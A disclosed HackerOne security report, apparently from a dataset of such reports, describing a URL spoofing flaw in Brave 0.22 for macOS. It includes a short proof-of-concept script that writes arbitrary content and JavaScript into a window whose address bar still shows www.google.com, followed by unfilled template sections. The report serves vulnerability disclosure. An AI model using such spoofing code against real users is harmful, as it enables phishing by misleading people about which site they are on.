---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '369086'
original_report_id: '369086'
title: URL spoofing in Brave for macOS
team_handle: brave
created_at: '2018-06-20T04:53:57.770Z'
disclosed_at: '2018-10-04T00:50:38.097Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: https://github.com/brave/browser-laptop
asset_type: SOURCE_CODE
max_severity: none
tags:
- hackerone
---

# URL spoofing in Brave for macOS

## Metadata

- HackerOne Report ID: 369086
- Weakness: 
- Program: brave
- Disclosed At: 2018-10-04T00:50:38.097Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
URL spoofing vulnerability.

## Repro

```
<script>
    window.onclick = function () {
        x = window.open('https://www.google.com/csi');
        setTimeout(function () {
            x.document.write(`I am not a www.google.com;<button onclick="alert('I can run JS on this page!')">click me</button>`)
        }, 100);
    }
</script>
```

URL in address bar is `https://www.google.com/csi`, but actually that's about:blank page.
Attacker could inject arbitrary content and execute javascript on this page.
Additionally, during alert(), address bar continue displaying `www.google.com`


## Products affected: 

Brave	0.22.810
V8	6.7.288.43
rev	8f30eeb
Muon	7.0.6
OS Release	17.6.0
Update Channel	Release
OS Architecture	x64
OS Platform	macOS
Node.js	7.9.0
Brave Sync	v1.4.2
libchromiumcontent	67.0.3396.71
OS: macOS 10.13.5 17F77 x86_64

## Impact

Typical URL spoofing vulnerability impact. Could be explained, if required.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
